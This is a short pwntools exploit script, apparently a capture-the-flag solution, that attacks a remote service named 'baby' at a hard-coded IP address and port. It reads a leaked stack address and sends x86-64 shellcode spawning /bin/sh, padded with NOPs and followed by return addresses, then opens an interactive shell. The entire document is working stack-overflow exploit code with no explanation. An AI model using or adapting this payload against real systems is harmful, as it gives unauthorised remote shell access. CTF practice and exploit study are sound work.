from pwn import *

e = ELF('./baby')
#p = process('./baby')
p = remote('142.93.113.134',9999)

ret_addr = 0x00400496

shellcode = "\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\xb0\x3b\x48\x89\xe7\x31\xf6\x31\xd2\x0f\x05"

ret = int(p.recvline().split(' ')[5].rstrip('\n'),16)
print "ret: " + hex(ret)
payload = shellcode
payload += '\x90'*(136-len(payload))
payload += p64(ret_addr)
payload += p64(ret)

p.sendline(payload)
p.interactive()